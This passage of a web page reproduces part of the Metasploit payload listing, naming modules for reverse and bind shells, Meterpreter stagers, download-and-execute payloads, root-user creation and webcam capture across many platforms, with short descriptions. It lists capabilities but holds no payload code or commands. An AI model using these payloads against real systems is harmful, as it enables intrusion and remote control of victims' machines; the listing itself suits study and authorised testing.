shell via Ruby</span><br><span class="line">    cmd&#x2F;windows&#x2F;download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a</span><br><span class="line">                                                        short command line.</span><br><span class="line">    cmd&#x2F;windows&#x2F;download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it</span><br><span class="line">    cmd&#x2F;windows&#x2F;generic                                 Executes the supplied command</span><br><span class="line">    cmd&#x2F;windows&#x2F;powershell_bind_tcp                     Interacts with a powershell session on an established socket connection</span><br><span class="line">    cmd&#x2F;windows&#x2F;powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_lua                             Creates an interactive shell via Lua</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_perl                            Creates an interactive shell via perl</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_powershell                      Connect back and create a command shell via Powershell</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_ruby                            Connect back and create a command shell via Ruby</span><br><span class="line">    firefox&#x2F;exec                                        This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash th</span><br><span class="line">                                                        e command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript &quot;launcher&quot; to d</span><br><span class="line">                                                        isk that hides the prompt.</span><br><span class="line">    firefox&#x2F;shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox&#39;s XPCOM API</span><br><span class="line">    firefox&#x2F;shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox&#39;s XPCOM API</span><br><span class="line">    generic&#x2F;custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.</span><br><span class="line">    generic&#x2F;debug_trap                                  Generate a debug trap in the target process</span><br><span class="line">    generic&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    generic&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    generic&#x2F;tight_loop                                  Generate a tight loop in the target process</span><br><span class="line">    java&#x2F;jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell</span><br><span class="line">    java&#x2F;jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell</span><br><span class="line">    java&#x2F;meterpreter&#x2F;bind_tcp                           Run a meterpreter server in Java. Listen for a connection</span><br><span class="line">    java&#x2F;meterpreter&#x2F;reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP</span><br><span class="line">    java&#x2F;meterpreter&#x2F;reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS</span><br><span class="line">    java&#x2F;meterpreter&#x2F;reverse_tcp                        Run a meterpreter server in Java. Connect back stager</span><br><span class="line">    java&#x2F;shell&#x2F;bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, &#x2F;bin&#x2F;sh everywhere else). Listen for a connection</span><br><span class="line">    java&#x2F;shell&#x2F;reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, &#x2F;bin&#x2F;sh everywhere else). Connect back stager</span><br><span class="line">    java&#x2F;shell_reverse_tcp                              Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter&#x2F;reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter_reverse_http              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter_reverse_https             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter_reverse_tcp               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;aarch64&#x2F;shell&#x2F;reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker</span><br><span class="line">    linux&#x2F;aarch64&#x2F;shell_reverse_tcp                     Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;armbe&#x2F;meterpreter_reverse_http                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armbe&#x2F;meterpreter_reverse_https               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armbe&#x2F;meterpreter_reverse_tcp                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armbe&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;armle&#x2F;adduser                                 Create a new user with UID 0</span><br><span class="line">    linux&#x2F;armle&#x2F;exec                                    Execute an arbitrary command</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter&#x2F;bind_tcp                    Inject the mettle server payload (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter&#x2F;reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter_reverse_http                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter_reverse_https               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter_reverse_tcp                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armle&#x2F;shell&#x2F;bind_tcp                          dup2 socket in r12, then execve. Listen for a connection</span><br><span class="line">    linux&#x2F;armle&#x2F;shell&#x2F;reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker</span><br><span class="line">    linux&#x2F;armle&#x2F;shell_bind_tcp                          Connect to target and spawn a command shell</span><br><span class="line">    linux&#x2F;armle&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;mips64&#x2F;meterpreter_reverse_http               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mips64&#x2F;meterpreter_reverse_https              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mips64&#x2F;meterpreter_reverse_tcp                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter&#x2F;reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter_reverse_http               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter_reverse_https              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter_reverse_tcp                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executin</span><br><span class="line">                                                        g other payloads that rely on initial startup procedures.</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;shell&#x2F;reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;shell_bind_tcp                         Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;shell_reverse_tcp                      Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;mipsle&#x2F;exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on</span><br><span class="line">                                                        targets with extremely limited buffer space.</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter&#x2F;reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter_reverse_http               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter_reverse_https              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter_reverse_tcp                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsle&#x2F;reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.</span><br><span class="line">    linux&#x2F;mipsle&#x2F;shell&#x2F;reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsle&#x2F;shell_bind_tcp                         Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;mipsle&#x2F;shell_reverse_tcp                      Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc&#x2F;meterpreter_reverse_http                  Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc&#x2F;meterpreter_reverse_https                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc&#x2F;meterpreter_reverse_tcp                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc&#x2F;shell_find_port                           Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;ppc&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc64&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc64&#x2F;shell_find_port                         Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;ppc64&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc64le&#x2F;meterpreter_reverse_http              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc64le&#x2F;meterpreter_reverse_https             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc64le&#x2F;meterpreter_reverse_tcp               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppce500v2&#x2F;meterpreter_reverse_http            Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppce500v2&#x2F;meterpreter_reverse_https           Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppce500v2&#x2F;meterpreter_reverse_tcp             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;exec                                      Execute an arbitrary command</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                      Inject the mettle server payload (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter_reverse_http                  Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter_reverse_https                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter_reverse_tcp                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)</span><br><span class="line">    linux&#x2F;x64&#x2F;pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)</span><br><span class="line">    linux&#x2F;x64&#x2F;shell&#x2F;bind_tcp                            Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: &#39;nmap -sS t</span><br><span class="line">                                                        arget -p-&#39;.</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_find_port                           Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;adduser                                   Create a new user with UID 0</span><br><span class="line">    linux&#x2F;x86&#x2F;chmod                                     Runs chmod on specified file with specified mode</span><br><span class="line">    linux&#x2F;x86&#x2F;exec                                      Execute an arbitrary command</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;find_tag                      Inject the mettle server payload (staged). Use an established connection</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter_reverse_http                  Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter_reverse_https                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter_reverse_tcp                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x86&#x2F;metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    linux&#x2F;x86&#x2F;metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    linux&#x2F;x86&#x2F;read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;find_tag                            Spawn a command shell (staged). Use an established connection</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: &#39;nmap -sS t</span><br><span class="line">                                                        arget -p-&#39;.</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_find_port                           Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_find_tag                            Spawn a shell on an established connection (proxy&#x2F;nat safe)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    linux&#x2F;zarch&#x2F;meterpreter_reverse_http                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;zarch&#x2F;meterpreter_reverse_https               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;zarch&#x2F;meterpreter_reverse_tcp                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    mainframe&#x2F;shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implementation does not include ebcdic character translatio</span><br><span class="line">                                                        n, so a client with translation capabilities is required. MSF handles this automatically.</span><br><span class="line">    multi&#x2F;meterpreter&#x2F;reverse_http                      Handle Meterpreter sessions regardless of the target arch&#x2F;platform. Tunnel communication over HTTP</span><br><span class="line">    multi&#x2F;meterpreter&#x2F;reverse_https                     Handle Meterpreter sessions regardless of the target arch&#x2F;platform. Tunnel communication over HTTPS</span><br><span class="line">    netware&#x2F;shell&#x2F;reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker</span><br><span class="line">    nodejs&#x2F;shell_bind_tcp                               Creates an interactive shell via nodejs</span><br><span class="line">    nodejs&#x2F;shell_reverse_tcp                            Creates an interactive shell via nodejs</span><br><span class="line">    nodejs&#x2F;shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL</span><br><span class="line">    osx&#x2F;armle&#x2F;execute&#x2F;bind_tcp                          Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    osx&#x2F;armle&#x2F;execute&#x2F;reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    osx&#x2F;armle&#x2F;shell&#x2F;bind_tcp                            Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    osx&#x2F;armle&#x2F;shell&#x2F;reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    osx&#x2F;armle&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    osx&#x2F;armle&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;armle&#x2F;vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Mi</span><br><span class="line">                                                        ller &lt;cmiller[at]securityevaluators.com&gt;.</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell&#x2F;bind_tcp                              Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell&#x2F;find_tag                              Spawn a command shell (staged). Use an established connection</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell&#x2F;reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;x64&#x2F;dupandexecve&#x2F;bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;dupandexecve&#x2F;reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;dupandexecve&#x2F;reverse_tcp_uuid               dup2 socket in edi, then execve. Connect back to the attacker with UUID Support (OSX x64)</span><br><span class="line">    osx&#x2F;x64&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                        Inject the mettle server payload (staged). Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_uuid                Inject the mettle server payload (staged). Connect back to the attacker with UUID Support (OSX x64)</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter_reverse_http                    Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter_reverse_https                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter_reverse_tcp                     Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    osx&#x2F;x64&#x2F;say                                         Say an arbitrary string outloud using Mac OS X text2speech</span><br><span class="line">    osx&#x2F;x64&#x2F;shell_bind_tcp                              Bind an arbitrary command to an arbitrary port</span><br><span class="line">    osx&#x2F;x64&#x2F;shell_find_tag                              Spawn a shell on an established connection (proxy&#x2F;nat safe)</span><br><span class="line">    osx&#x2F;x64&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;bundleinject&#x2F;bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;bundleinject&#x2F;reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    osx&#x2F;x86&#x2F;isight&#x2F;bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;isight&#x2F;reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    osx&#x2F;x86&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell&#x2F;bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell&#x2F;reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell</span><br><span class="line">    php&#x2F;bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)</span><br><span class="line">    php&#x2F;bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6</span><br><span class="line">    php&#x2F;bind_php                                        Listen for a connection and spawn a command shell via php</span><br><span class="line">    php&#x2F;bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)</span><br><span class="line">    php&#x2F;download_exec                                   Download an EXE from an HTTP URL and execute it</span><br><span class="line">    php&#x2F;exec                                            Execute a single system command</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp                            Run a meterpreter server in PHP. Listen for a connection</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support</span><br><span class="line">    php&#x2F;meterpreter&#x2F;reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions</span><br><span class="line">    php&#x2F;meterpreter&#x2F;reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions</span><br><span class="line">    php&#x2F;meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)</span><br><span class="line">    php&#x2F;reverse_perl                                    Creates an interactive shell via perl</span><br><span class="line">    php&#x2F;reverse_php                                     Reverse PHP connect back shell with checks for disabled functions</span><br><span class="line">    php&#x2F;shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evi</span><br><span class="line">                                                        l-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless fir</span><br><span class="line">                                                        ewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appea</span><br><span class="line">                                                        rs to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only</span><br><span class="line">                                                        tested on Apache but it might work on other web servers that leak file descriptors to child processes.</span><br><span class="line">    python&#x2F;meterpreter&#x2F;bind_tcp                         Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Listen for a connection</span><br><span class="line">    python&#x2F;meterpreter&#x2F;bind_tcp_uuid                    Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Listen for a connection with UUID Support</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_http                     Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Tunnel communication over HTTP</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_https                    Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Tunnel communication over HTTP using SSL</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_tcp                      Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Connect back to the attacker</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_tcp_ssl                  Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Reverse Python connect back stager using SSL</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_tcp_uuid                 Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Connect back to the attacker with UUID Support</span><br><span class="line">    python&#x2F;meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;pingback_bind_tcp                            Listens for a connection from the attacker, sends a UUID, then terminates</span><br><span class="line">    python&#x2F;pingback_reverse_tcp                         Connects back to the attacker, sends a UUID, then terminates</span><br><span class="line">    python&#x2F;shell_bind_tcp                               Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.</span><br><span class="line">    python&#x2F;shell_reverse_tcp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.</span><br><span class="line">    python&#x2F;shell_reverse_tcp_ssl                        Creates an interactive shell via Python, uses SSL, encodes with base64 by design. Compatible with Python 2.6-2.7 an</span><br><span class="line">                                                        d 3.4+.</span><br><span class="line">    python&#x2F;shell_reverse_udp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.</span><br><span class="line">    r&#x2F;shell_bind_tcp                                    Continually listen for a connection and spawn a command shell via R</span><br><span class="line">    r&#x2F;shell_reverse_tcp                                 Connect back and create a command shell via R</span><br><span class="line">    ruby&#x2F;pingback_bind_tcp                              Listens for a connection from the attacker, sends a UUID, then terminates</span><br><span class="line">    ruby&#x2F;pingback_reverse_tcp                           Connect back to the attacker, sends a UUID, then terminates</span><br><span class="line">    ruby&#x2F;shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    ruby&#x2F;shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    ruby&#x2F;shell_reverse_tcp                              Connect back and create a command shell via Ruby</span><br><span class="line">    ruby&#x2F;shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    solaris&#x2F;sparc&#x2F;shell_bind_tcp                        Listen for a connection and spawn a command shell</span><br><span class="line">    solaris&#x2F;sparc&#x2F;shell_find_port                       Spawn a shell on an established connection</span><br><span class="line">    solaris&#x2F;sparc&#x2F;shell_reverse_tcp                     Connect back to attacker and spawn a command shell</span><br><span class="line">    solaris&#x2F;x86&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell</span><br><span 